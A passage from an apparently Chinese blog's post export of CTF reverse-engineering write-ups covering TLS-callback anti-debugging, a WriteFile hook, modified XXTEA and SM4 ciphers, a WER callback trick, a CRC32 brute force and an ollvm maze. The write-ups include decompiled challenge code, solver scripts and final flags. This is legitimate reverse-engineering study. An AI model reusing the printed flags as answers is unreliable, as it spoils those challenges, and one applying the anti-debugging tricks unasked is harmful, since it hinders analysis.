msvcbuild.bat编译出的是32位 反编译bobsayshilol&#x2F;luajit-decomp at deprecated (github.com) 下载反编译工具 然后将上一步src文件夹里面jit文件夹，和lua51.dll luajit.exe 放到刚刚下载的反编译工具文件夹里面 然后将我们的题目附件改名为test.lua，再按下decoder_new.exe该文件就出现了out.lua和out2.lua 用sublime打开，就可以开始分析字节码了 未完待续。。","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-luajit","slug":"luajit","permalink":"http://example.com/tags/luajit/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"TWIN","slug":"TWIN","date":"2022-05-27T16:00:00.000Z","updated":"2022-05-28T14:18:24.673Z","comments":true,"path":"2022/05/28/TWIN/","link":"","permalink":"http://example.com/2022/05/28/TWIN/","excerpt":"","text":"TLS回调函数：TLS(Thread Local Storage, 线程局部存储)回调函数，TLS 回调函数的调用运行要先于 EP 代码的执行，并且每次创建或结束线程都会再次调用，故常用于反调试。 可以在节区表发现IMAGE_TLS_DIRECTORY，找到Address of Callbacks（注意回调函数一般不止一个） 题解： 32位无壳 首先是一个虚假的逻辑验证。 在函数栏搜索找到callback函数，但是$+5,没有直接反编译，找到主要回调函数 这里有一个小花指令，最好retn会跳到sub_4019BF,后面还会有一处 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158void __usercall sub_4019BF(int a1@&lt;ebp&gt;)&#123; void *v1; // eax if ( *(_DWORD *)(a1 + 12) == 1 ) &#123; memset((void *)(a1 - 284), 0, 0x50u); sub_401930((void *)(a1 - 284)); *(_BYTE *)(a1 - 1) = 0; *(_BYTE *)(a1 - 1) = NtCurrentPeb()-&gt;BeingDebugged; if ( !*(_BYTE *)(a1 - 1) ) return; *(_BYTE *)(a1 - 32) = 57; *(_BYTE *)(a1 - 31) = 51; *(_BYTE *)(a1 - 30) = 62; *(_BYTE *)(a1 - 29) = 56; *(_BYTE *)(a1 - 28) = 0; sub_4018C0(a1 - 32); hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, (LPCSTR)(a1 - 32)); *(_DWORD *)dword_404448 = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u); *(_BYTE *)(a1 - 116) = 47; *(_BYTE *)(a1 - 115) = 19; *(_BYTE *)(a1 - 114) = 26; *(_BYTE *)(a1 - 113) = 30; *(_BYTE *)(a1 - 112) = 12; *(_BYTE *)(a1 - 111) = 26; *(_BYTE *)(a1 - 110) = 95; *(_BYTE *)(a1 - 109) = 22; *(_BYTE *)(a1 - 108) = 17; *(_BYTE *)(a1 - 107) = 15; *(_BYTE *)(a1 - 106) = 10; *(_BYTE *)(a1 - 105) = 11; *(_BYTE *)(a1 - 104) = 95; *(_BYTE *)(a1 - 103) = 6; *(_BYTE *)(a1 - 102) = 16; *(_BYTE *)(a1 - 101) = 10; *(_BYTE *)(a1 - 100) = 13; *(_BYTE *)(a1 - 99) = 95; *(_BYTE *)(a1 - 98) = 25; *(_BYTE *)(a1 - 97) = 19; *(_BYTE *)(a1 - 96) = 30; *(_BYTE *)(a1 - 95) = 24; *(_BYTE *)(a1 - 94) = 69; *(_BYTE *)(a1 - 93) = 95; *(_BYTE *)(a1 - 92) = 0; v1 = (void *)sub_4018C0(a1 - 116); sub_401930(v1); *(_BYTE *)(a1 - 8) = 90; *(_BYTE *)(a1 - 7) = 12; *(_BYTE *)(a1 - 6) = 0; sub_4018C0(a1 - 8); sub_401130((char *)(a1 - 8), dword_404448[0]); &#125; if ( !*(_DWORD *)(a1 + 12) ) &#123; *(_BYTE *)(a1 - 24) = 81; *(_BYTE *)(a1 - 23) = 80; *(_BYTE *)(a1 - 22) = 11; *(_BYTE *)(a1 - 21) = 18; *(_BYTE *)(a1 - 20) = 15; *(_BYTE *)(a1 - 19) = 0; sub_4018C0(a1 - 24); sub_401410(); memset((void *)(a1 - 204), 0, 0x44u); *(_DWORD *)(a1 - 204) = 68; CreateProcessA( (LPCSTR)(a1 - 24), 0, 0, 0, 0, 3u, 0, 0, (LPSTARTUPINFOA)(a1 - 204), (LPPROCESS_INFORMATION)(a1 - 136)); *(_BYTE *)(a1 - 44) = 28; *(_BYTE *)(a1 - 43) = 16; *(_BYTE *)(a1 - 42) = 13; *(_BYTE *)(a1 - 41) = 13; *(_BYTE *)(a1 - 40) = 26; *(_BYTE *)(a1 - 39) = 28; *(_BYTE *)(a1 - 38) = 11; *(_BYTE *)(a1 - 37) = 117; *(_BYTE *)(a1 - 36) = 0; *(_BYTE *)(a1 - 16) = 8; *(_BYTE *)(a1 - 15) = 13; *(_BYTE *)(a1 - 14) = 16; *(_BYTE *)(a1 - 13) = 17; *(_BYTE *)(a1 - 12) = 24; *(_BYTE *)(a1 - 11) = 117; *(_BYTE *)(a1 - 10) = 0; *(_BYTE *)(a1 - 88) = 47; *(_BYTE *)(a1 - 87) = 19; *(_BYTE *)(a1 - 86) = 26; *(_BYTE *)(a1 - 85) = 30; *(_BYTE *)(a1 - 84) = 12; *(_BYTE *)(a1 - 83) = 26; *(_BYTE *)(a1 - 82) = 95; *(_BYTE *)(a1 - 81) = 28; *(_BYTE *)(a1 - 80) = 19; *(_BYTE *)(a1 - 79) = 16; *(_BYTE *)(a1 - 78) = 12; *(_BYTE *)(a1 - 77) = 26; *(_BYTE *)(a1 - 76) = 95; *(_BYTE *)(a1 - 75) = 11; *(_BYTE *)(a1 - 74) = 23; *(_BYTE *)(a1 - 73) = 26; *(_BYTE *)(a1 - 72) = 95; *(_BYTE *)(a1 - 71) = 27; *(_BYTE *)(a1 - 70) = 26; *(_BYTE *)(a1 - 69) = 29; *(_BYTE *)(a1 - 68) = 10; *(_BYTE *)(a1 - 67) = 24; *(_BYTE *)(a1 - 66) = 24; *(_BYTE *)(a1 - 65) = 26; *(_BYTE *)(a1 - 64) = 13; *(_BYTE *)(a1 - 63) = 95; *(_BYTE *)(a1 - 62) = 30; *(_BYTE *)(a1 - 61) = 17; *(_BYTE *)(a1 - 60) = 27; *(_BYTE *)(a1 - 59) = 95; *(_BYTE *)(a1 - 58) = 11; *(_BYTE *)(a1 - 57) = 13; *(_BYTE *)(a1 - 56) = 6; *(_BYTE *)(a1 - 55) = 95; *(_BYTE *)(a1 - 54) = 30; *(_BYTE *)(a1 - 53) = 24; *(_BYTE *)(a1 - 52) = 30; *(_BYTE *)(a1 - 51) = 22; *(_BYTE *)(a1 - 50) = 17; *(_BYTE *)(a1 - 49) = 117; *(_BYTE *)(a1 - 48) = 0; sub_401510(a1 - 24, a1 - 136); if ( dword_404440 == 1 ) &#123; sub_4012C0(*(_DWORD *)dword_404448 + 20, 5, &amp;unk_40405C); *(_DWORD *)(a1 - 120) = memcmp((const void *)(*(_DWORD *)dword_404448 + 20), &amp;unk_40402C, 0x14u); if ( !*(_DWORD *)(a1 - 120) ) &#123; sub_4018C0(a1 - 44); sub_401930((void *)(a1 - 44));LABEL_12: CloseHandle(hObject); return; &#125; &#125; else if ( dword_404440 == -2 ) &#123; sub_4018C0(a1 - 88); sub_401930((void *)(a1 - 88)); goto LABEL_12; &#125; sub_4018C0(a1 - 16); sub_401930((void *)(a1 - 16)); goto LABEL_12; &#125;&#125; 这个函数有两大部分 这个a1 + 12就是对应着运行前与退出，对应DLL_PROCESS_ATTACH和DLL_PROCESS_DETACH 所以总结一下！a1 + 12 &#x3D;&#x3D; 1是线程运行之前执行 a1 + 12 &#x3D;&#x3D; 0 是线程退出后运行 首先会遇到一个PEB反调试，我们直接修改ZF标志位绕过。 然后就是一个异或，将原始数据inputflag混肴。 紧接着读取我们的输入， 输入之后F9进入第二部分 获取WriteFile API的地址 将WriteFile API地址改成自写函数的地址（也就是Hook函数） 也就是之后我们调用WriteFile函数地址就会调用Hook函数（Hook函数里执行完Hook代码就会脱钩） GetModuleHandleA得到WiteFile函数的句柄，GetProcAddress函数获取WriteFile函数的地址存入dword_4043DC，并在sub_4016C0中将这个值修改为sub_401650的地址值。 随后在第二个TLS函数会调用ExitProcess()，也就是退出进程，那么退出进程又会调用TLS函数链，于是又回到了第一个TLS函数，不过这次进的是退出线程的函数块，分析主要函数 这里创建了一个文件，也就是tmp文件，但是对名字也进行了混肴,然后往里面写入进程。 我们可以发现这里的writefile变成了我们相要执行的函数 把子进程的两个值改成6，实践上是xxtea在加密过程中的右移轮次。 接下来分析一下tmp文件。 其中 先判断是否被调试，然后对delta进行异或操作。 hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name_FLAG);创建名字为FLAG的文件映射对象，用于进程间通信。*(_DWORD *)input = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u);存了内存映射文件，便于后面的共享内存。简而言之，就是创建一个名为FLAG的文件映射对象，把input指向的地址设置成一块共享的内存，这样就可以在子进程里对input这块内存进行修改，实现加密。 一个魔改的XXTEA加密，z右移5改成了右移6位 这里一处函数需要注意 WaitForDebugEvent表明父进程调用子进程是以调试方式打开，也就是说父进程调试子进程，所以实际上子进程的反调试是不能绕过的，正常执行程序应该会进入子进程的if语句，对key和delta进行一些魔改运算。0xC0000005，这是一个异常代码，代表EXCEPTION_ACCESS_VIOLATION，内存访问异常，也即子进程中触发的异常。 也就是说，子进程被父进程调试，当子进程发生异常，应当交由调试者（父进程）处理。所以当子进程中触发异常，程序就会流回父进程，判断是否为内存访问异常，如果是，就对eip和eax做出相应修改。 再回去看子进程触发异常的地方，eip+5之后正好跳过了会触发异常的地方。而eax里存储的实际上是delta经过一通魔改运算之后的结果。也就是说，delta不仅在子进程里被修改，还会在父进程里异或一次，也就是还原成之前最初的模样 前一半的（修改的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#define DELTA 0x1c925d64#define MX (((z&gt;&gt;6^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))uint32_t k[4]= &#123;0x12,0x90,0x56,0x78&#125;;void xxtea(uint32_t* v, int n, uint32_t* key)&#123; unsigned int sum,z,p,y; int e, rounds; rounds = 6 + 52/n; sum = rounds * DELTA; y = v[0]; do &#123; e = (sum &gt;&gt; 2) &amp; 3; for (p=n-1; p&gt;0; p--) &#123; z = v[p-1]; y = v[p] -= MX; &#125; z = v[n-1]; y = v[0] -= MX; sum -= DELTA; &#125; while (--rounds);&#125;int main()&#123; uint32_t v[5] = &#123;0x6b7ce328,0x4841d5dd,0x963784dc,0xef8a3226,0x776b226&#125;; int n = 5; xxtea(v, n, k); int i; for(i=0;i&lt;5;i++) &#123; printf(&quot;%c&quot;,v[i]&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;8&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;16&amp;0xff); printf(&quot;%c&quot;,v[i]&gt;&gt;24&amp;0xff); &#125; return 0;&#125; 后面那半就比较好出了，没有改任何Delta数或XXTEA算法 miniLctf{cbda59ff59e3e90c91c02e9b40b78b} 参考：miniL2022 WP 今晚恰烤lq！ - 云之君 (yunzh1jun.com)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"TLS回调函数","slug":"TLS回调函数","permalink":"http://example.com/tags/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/"},{"name":"反调试","slug":"反调试","permalink":"http://example.com/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"name":"异常处理","slug":"异常处理","permalink":"http://example.com/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"CEF","slug":"cef","date":"2022-05-26T16:00:00.000Z","updated":"2022-05-27T14:31:42.247Z","comments":true,"path":"2022/05/27/cef/","link":"","permalink":"http://example.com/2022/05/27/cef/","excerpt":"","text":"32位无壳程序 CEF简介: 嵌入式Chromium框架(简称CEF) 是一个由Marshall Greenblatt在2008建立的开源项目，它主要目的是开发一个基于Google Chromium的Webbrowser控件。CEF支持一系列的编程语言和操作系统，并且能很容易地整合到新的或已有的工程中去。 解题：正面去分析的话，十分困难。去搜索相应字符串无果 这里我们可以去从数据调用去分析，我们去分析.data的数据 一组奇怪的数据，猜测加密时用到，交叉引用找到调用的地方 调试验证一下，一开始会停在调用的dll函数里面，我们直接步过，然后输入32位之后就会断下F9提示correct，验证我们的猜想是正确的。调试发现其实，加密整个逻辑就在else里面，一个魔改的SM4，其基本运算为异或^和循环左移&lt;&lt;&lt; round函数 解密： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned int SK[32] = &#123; 0xE8DB227C, 0x012451B9, 0xED08A9DB, 0xC91F65C3, 0xB3D1E981, 0x319B4734, 0xA4BA5551, 0xD0F2ED2D, 0x4A00D692, 0xE0AEFE30, 0x6BBCDB4A, 0xC315F6F1, 0xB4E1B030, 0x694C4ACE, 0x479208D3, 0x3F8C7B97, 0x747777A6, 0xEDEC9BBB, 0xC8E506C1, 0xB955A92A, 0xB388FDBB, 0x1A4697C3, 0xB10826AA, 0xBB1F2207, 0x291DCD60, 0x2BA3E3A7, 0x1B83DFDD, 0x014D4FD5, 0x80C659F3, 0x3EB45B23, 0x43E36266, 0xBD22532C&#125;;#define GET_ULONG(n, b, i) \\ (n) = ( (unsigned long) (b)[(i + 3)] &lt;&lt; 24 ) \\ | ( (unsigned long) (b)[(i + 2)] &lt;&lt; 16 ) \\ | ( (unsigned long) (b)[(i + 1)] &lt;&lt; 8 ) \\ | ( (unsigned long) (b)[(i )] ); \\#define PUT_ULONG(n, b, i) \\&#123; \\ (b)[(i) + 3] = (unsigned char) ( (n) &gt;&gt; 24 ); \\ (b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 16 ); \\ (b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 8 ); \\ (b)[(i) ] = (unsigned char) ( (n) ); \\&#125; #define SHL(x, n) ( ((x) &amp; 0xFFFFFFFF) &lt;&lt; n )#define ROTL(x, n) ( SHL((x), n) | ((x) &gt;&gt; (32 - n)) )#define SWAP(a, b) &#123; unsigned t = a; a = b; b = t; t = 0; &#125; void SM4_Decrypt(unsigned char * input, unsigned char * output, int len); void Round(unsigned char input[16], unsigned char output[16]);int main(void)&#123; unsigned char input[] = &#123; 0x7D, 0x54, 0xCB, 0xC0, 0x74, 0xDB, 0xF5, 0xD7, 0x6F, 0xD9, 0x92, 0x1B, 0xEB, 0x28, 0x46, 0x20, 0xE5, 0xD5, 0xD3, 0x60, 0x80, 0x6D, 0x36, 0x2F, 0xB0, 0x63, 0x2F, 0x61, 0x20, 0x0F, 0xA9, 0x30 &#125;; unsigned char output[32] = &#123; 0 &#125;; int i; SM4_Decrypt(input, output, 32); for ( i = 0; i &lt; 32; i++ ) &#123;// printf(&quot;0x%X, &quot;, output[i]); printf(&quot;%c&quot;, output[i]); &#125; return 0;&#125;void SM4_Decrypt(unsigned char * input, unsigned char * output, int len)&#123; int i; for ( i = 0; i &lt; 16; i++ ) SWAP(SK[i], SK[31 - i]); while ( len &gt; 0 ) &#123; Round(input, output); input += 16; output += 16; len -= 16; &#125;&#125;void Round(unsigned char input[16], unsigned char output[16])&#123; unsigned long tmp[4] = &#123; 0 &#125;; int i; unsigned int t = 0; GET_ULONG(tmp[0], input, 0); GET_ULONG(tmp[1], input, 4); GET_ULONG(tmp[2], input, 8); GET_ULONG(tmp[3], input, 12); for ( i = 0; i &lt; 32; i++ ) &#123; t = SK[i] ^ tmp[(i + 1) % 4] ^ tmp[(i + 2) % 4] ^ tmp[(i + 3) % 4]; tmp[i % 4] ^= t ^ ROTL(t, 2) ^ ROTL(t, 24) ^ ROTL(t, 10) ^ ROTL(t, 18); &#125; for ( i = 0 ; i &lt; 4; i++ ) GET_ULONG(SK[26 - i], input, i * 4); // 正好是把加密后的值放入 那么解密的时候就是把密文放入即可 PUT_ULONG(tmp[3], output, 0); PUT_ULONG(tmp[2], output, 4); PUT_ULONG(tmp[1], output, 8); PUT_ULONG(tmp[0], output, 12);&#125; 运行得到 3b2365b04700b5eac3a5fd0ba21b687f 参考：DASCTF2022 X VOID-CEF - P.Z’s Blog (ppppz.net)","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-CEF","slug":"CEF","permalink":"http://example.com/tags/CEF/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"WER","slug":"WER","date":"2022-05-25T16:00:00.000Z","updated":"2022-05-26T14:18:22.094Z","comments":true,"path":"2022/05/26/WER/","link":"","permalink":"http://example.com/2022/05/26/WER/","excerpt":"","text":"无壳，64位 什么是WER：Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。 参考：关于 WER - Win32 apps | Microsoft Docs 其关键函数如下： 123DWORD WINAPI ApplicationRecoveryCallback( PVOID pvParameter //上下文信息在调用‎‎注册应用程序恢复回拨‎‎函数以注册恢复时指定。‎); ‎应用程序定义的回调函数，用于在应用程序遇到未处理的异常或无响应时保存数据和应用程序状态信息。 参考：ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs 1234HRESULT WerReportHang( [in] HWND hwndHungApp, //‎处理未响应的窗口。 [in, optional] PCWSTR pwzHungApplicationName //要在挂起的报告 UI 中显示的无响应应用程序的名称。); 返回值‎：‎返回S_OK函数是否能够在失败时启动报告或错误代码。请注意，S_OK并不一定意味着“无响应”报告已成功完成，而只是表示已启动。‎ 参考：WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs 主要运行逻辑为： 1.在初始化注册ApplicationRecoveryCallback函数 2.在OnExit调用WerReportHang触发异常 3.运用ApplicationRecoveryCallback进行真正的逻辑处理。 本题OnExit函数就在main函数里面，调用WerReportHang就会关闭调试器，调试不起来 解题： 搜索关键函数，在import表里面找到，放在了一个dll里面 然后交叉引用找到： 这里的sub_14000F3B0就是我们要找的关键函数 也可以通过MessageBox函数来找。 123data = [ 0x05, 0x03, 0x55, 0x05, 0x04, 0x07, 0x5E, 0x54, 0x05, 0x07, 0x50, 0x02, 0x03, 0x53, 0x5F, 0x50, 0x53, 0x50, 0x53, 0x05, 0x55, 0x00, 0x54, 0x55, 0x57, 0x03, 0x05, 0x02, 0x52, 0x50, 0x51, 0x53]for i in range(len(data)): print(chr(data[i] ^ 102), end = &quot;&quot;) 异或写脚本得到flag","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-[wer]","slug":"wer","permalink":"http://example.com/tags/wer/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"末日邀请","slug":"KCTF-末日邀请（加密闯关）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-24T15:49:32.139Z","comments":true,"path":"2022/05/24/KCTF-末日邀请（加密闯关）/","link":"","permalink":"http://example.com/2022/05/24/KCTF-%E6%9C%AB%E6%97%A5%E9%82%80%E8%AF%B7%EF%BC%88%E5%8A%A0%E5%AF%86%E9%97%AF%E5%85%B3%EF%BC%89/","excerpt":"","text":"先是输入flag也就是ID，然后进行check，主要考察算法。 对我们的输入进行一系列异或，最后赋值给v39，注意这里v39类型是char，接着进行sbox数据初始化， 然后进行CRC32验证，这里可以动调取到flag，这里v34的值后面会给出并进行验证。 接着先将字符转成数值，存入内存，并且如果大于58就减去55.接着用冰雹猜想验证输入的前三位。我们可以爆破得到v17的值是定值7.具体前三位先按下不表 爆破代码： 123456789101112131415161718192021222324252627#include &lt;cstring&gt;#include &lt;iostream&gt;using namespace std;int i; // edxint v13; // ecxint v15; // eaxint j; // edxint v17; // ediint v33[200]; // [esp+10h] [ebp-368h]int main()&#123; for (int i = 0; i &lt;= 0xff; i++) &#123; v13 = i; v15 = v13; for (j = 1; j &lt; 200; ++j) &#123; if ((v15 &amp; 1) != 0) // 奇数*3+1 v15 = 3 * v15 + 1; else v15 &gt;&gt;= 1; // 偶数右移1 v33[j] = v15; &#125; v17 = v33[198] | v33[197] | v33[196]; cout &lt;&lt; v17 &lt;&lt; endl; &#125;&#125; 后面就是判断后四位是否为KCTF 动调发现是v41[1]是输入的第8个字符，推测后面还需要验证九位，然后进行取余验证，依次取最高前i位，看是否能取余i，不能则失败。但是后面对这里有一个约束。先是冒泡排序从小到大排序，然后对比19，也就是必须包含19每个数字 爆破取得这九位：381654729 12345for i in range(100000000,1000000000): if i//10000000 %2 == 0 and i//1000000%3 == 0 and i//100000%4 == 0 and i//10000%5 == 0 and i//1000 %6 == 0 and i//100 % 7 == 0 and i//10 % 8 == 0 and i%9 == 0: num_all = str(i) if &quot;1&quot; in num_all and &quot;2&quot; in num_all and &quot;3&quot; in num_all and &quot;4&quot; in num_all and &quot;5&quot; in num_all and &quot;6&quot; in num_all and &quot;7&quot; in num_all and &quot;8&quot; in num_all and &quot;9&quot; in num_all : print(i) 最后就是判断v34是否相等 也就是前三位 爆破得到前三位：421 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;stdint.h&gt; uint32_t magic_arr[] = &#123;0x00000000, 0x09073096, 0x120E612C, 0x1B0951BA, 0xFF6DC419, 0xF66AF48F, 0xED63A535, 0xE46495A3, 0xFEDB8832, 0xF7DCB8A4, 0xECD5E91E, 0xE5D2D988, 0x01B64C2B, 0x08B17CBD, 0x13B82D07, 0x1ABF1D91, 0xFDB71064, 0xF4B020F2, 0xEFB97148, 0xE6BE41DE, 0x02DAD47D, 0x0BDDE4EB, 0x10D4B551, 0x19D385C7, 0x036C9856, 0x0A6BA8C0, 0x1162F97A, 0x1865C9EC, 0xFC015C4F, 0xF5066CD9, 0xEE0F3D63, 0xE7080DF5, 0xFB6E20C8, 0xF269105E, 0xE96041E4, 0xE0677172, 0x0403E4D1, 0x0D04D447, 0x160D85FD, 0x1F0AB56B, 0x05B5A8FA, 0x0CB2986C, 0x17BBC9D6, 0x1EBCF940, 0xFAD86CE3, 0xF3DF5C75, 0xE8D60DCF, 0xE1D13D59, 0x06D930AC, 0x0FDE003A, 0x14D75180, 0x1DD06116, 0xF9B4F4B5, 0xF0B3C423, 0xEBBA9599, 0xE2BDA50F, 0xF802B89E, 0xF1058808, 0xEA0CD9B2, 0xE30BE924, 0x076F7C87, 0x0E684C11, 0x15611DAB, 0x1C662D3D, 0xF6DC4190, 0xFFDB7106, 0xE4D220BC, 0xEDD5102A, 0x09B18589, 0x00B6B51F, 0x1BBFE4A5, 0x12B8D433, 0x0807C9A2, 0x0100F934, 0x1A09A88E, 0x130E9818, 0xF76A0DBB, 0xFE6D3D2D, 0xE5646C97, 0xEC635C01, 0x0B6B51F4, 0x026C6162, 0x196530D8, 0x1062004E, 0xF40695ED, 0xFD01A57B, 0xE608F4C1, 0xEF0FC457, 0xF5B0D9C6, 0xFCB7E950, 0xE7BEB8EA, 0xEEB9887C, 0x0ADD1DDF, 0x03DA2D49, 0x18D37CF3, 0x11D44C65, 0x0DB26158, 0x04B551CE, 0x1FBC0074, 0x16BB30E2, 0xF2DFA541, 0xFBD895D7, 0xE0D1C46D, 0xE9D6F4FB, 0xF369E96A, 0xFA6ED9FC, 0xE1678846, 0xE860B8D0, 0x0C042D73, 0x05031DE5, 0x1E0A4C5F, 0x170D7CC9, 0xF005713C, 0xF90241AA, 0xE20B1010, 0xEB0C2086, 0x0F68B525, 0x066F85B3, 0x1D66D409, 0x1461E49F, 0x0EDEF90E, 0x07D9C998, 0x1CD09822, 0x15D7A8B4, 0xF1B33D17, 0xF8B40D81, 0xE3BD5C3B, 0xEABA6CAD, 0xEDB88320, 0xE4BFB3B6, 0xFFB6E20C, 0xF6B1D29A, 0x12D54739, 0x1BD277AF, 0x00DB2615, 0x09DC1683, 0x13630B12, 0x1A643B84, 0x016D6A3E, 0x086A5AA8, 0xEC0ECF0B, 0xE509FF9D, 0xFE00AE27, 0xF7079EB1, 0x100F9344, 0x1908A3D2, 0x0201F268, 0x0B06C2FE, 0xEF62575D, 0xE66567CB, 0xFD6C3671, 0xF46B06E7, 0xEED41B76, 0xE7D32BE0, 0xFCDA7A5A, 0xF5DD4ACC, 0x11B9DF6F, 0x18BEEFF9, 0x03B7BE43, 0x0AB08ED5, 0x16D6A3E8, 0x1FD1937E, 0x04D8C2C4, 0x0DDFF252, 0xE9BB67F1, 0xE0BC5767, 0xFBB506DD, 0xF2B2364B, 0xE80D2BDA, 0xE10A1B4C, 0xFA034AF6, 0xF3047A60, 0x1760EFC3, 0x1E67DF55, 0x056E8EEF, 0x0C69BE79, 0xEB61B38C, 0xE266831A, 0xF96FD2A0, 0xF068E236, 0x140C7795, 0x1D0B4703, 0x060216B9, 0x0F05262F, 0x15BA3BBE, 0x1CBD0B28, 0x07B45A92, 0x0EB36A04, 0xEAD7FFA7, 0xE3D0CF31, 0xF8D99E8B, 0xF1DEAE1D, 0x1B64C2B0, 0x1263F226, 0x096AA39C, 0x006D930A, 0xE40906A9, 0xED0E363F, 0xF6076785, 0xFF005713, 0xE5BF4A82, 0xECB87A14, 0xF7B12BAE, 0xFEB61B38, 0x1AD28E9B, 0x13D5BE0D, 0x08DCEFB7, 0x01DBDF21, 0xE6D3D2D4, 0xEFD4E242, 0xF4DDB3F8, 0xFDDA836E, 0x19BE16CD, 0x10B9265B, 0x0BB077E1, 0x02B74777, 0x18085AE6, 0x110F6A70, 0x0A063BCA, 0x03010B5C, 0xE7659EFF, 0xEE62AE69, 0xF56BFFD3, 0xFC6CCF45, 0xE00AE278, 0xE90DD2EE, 0xF2048354, 0xFB03B3C2, 0x1F672661, 0x166016F7, 0x0D69474D, 0x046E77DB, 0x1ED16A4A, 0x17D65ADC, 0x0CDF0B66, 0x05D83BF0, 0xE1BCAE53, 0xE8BB9EC5, 0xF3B2CF7F, 0xFAB5FFE9, 0x1DBDF21C, 0x14BAC28A, 0x0FB39330, 0x06B4A3A6, 0xE2D03605, 0xEBD70693, 0xF0DE5729, 0xF9D967BF, 0xE3667A2E, 0xEA614AB8, 0xF1681B02, 0xF86F2B94, 0x1C0BBE37, 0x150C8EA1, 0x0E05DF1B, 0x0702EF8D&#125;; char cstr[] = &quot;...KCTF381654729&quot;; int main() &#123; for (int i = 0x20; i &lt; 0x7e; i++) &#123; for (int j = 0x20; j &lt; 0x7e; j++) &#123; for (int k = 0x20; k &lt; 0x7e; k++) &#123; cstr[0] = i; cstr[1] = j; cstr[2] = k; int32_t v11 = -1; for (int idx = 0; idx &lt; 16; idx++) &#123; v11 = magic_arr[(uint8_t)(v11 ^ cstr[idx])] ^ (v11 &gt;&gt; 8); &#125; if ((~v11) == 0xF52E0765) &#123; printf(&quot;%c %c %c\\n&quot;, i, j, k); &#125; &#125; &#125; &#125;&#125; 最后的flag:421KCTF381654729","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"-加解密","slug":"加解密","permalink":"http://example.com/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"ezam","slug":"ezam（ollvm 迷宫 进制）","date":"2022-05-23T16:00:00.000Z","updated":"2022-05-28T09:03:02.930Z","comments":true,"path":"2022/05/24/ezam（ollvm 迷宫 进制）/","link":"","permalink":"http://example.com/2022/05/24/ezam%EF%BC%88ollvm%20%E8%BF%B7%E5%AE%AB%20%E8%BF%9B%E5%88%B6%EF%BC%89/","excerpt":"","text":"题目打开 标准的ollvm混肴，用脚本两次去除 得到正常的程序 初步分析是以为多项式相加，疏忽了v17以及前面一大段数据的初始化。想着用z3硬解失败了。主要逻辑为读取输入，判断是否为数字，然后转换成四进制，走迷宫。前面的一大段加密是初始化迷宫地图v17，我们可以动调得到一个16*28的迷宫：（做题多尝试 123456789101112131415161,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,1,1,0,0,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,1,0,0,0,1,0,0,1,1,1,1,1,1,1,1,0,0,0,1,0,0,0,0,0,1,1,0,1,1,0,0,1,0,0,0,1,0,0,1,0,0,1,1,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,1,1,0,0,1,0,0,1,0,0,0,1,0,0,0,1,1,1,0,0,0,1,0,1,1,0,0,0,1,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,1,0,0,1,0,1,0,0,0,1,1,0,1,0,0,0,0,1,0,0,0,0,0,0,1,0,1,1,0,1,0,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,1,0,1,1,1,0,0,1,1,1,1,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,1,0,0,0,0,0,0,0,1,0,0,0,1,1,1,1,0,0,0,1,1,0,0,0,1,1,0,0,0,0,0,0,1,0,0,0,1,0,1,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,1,0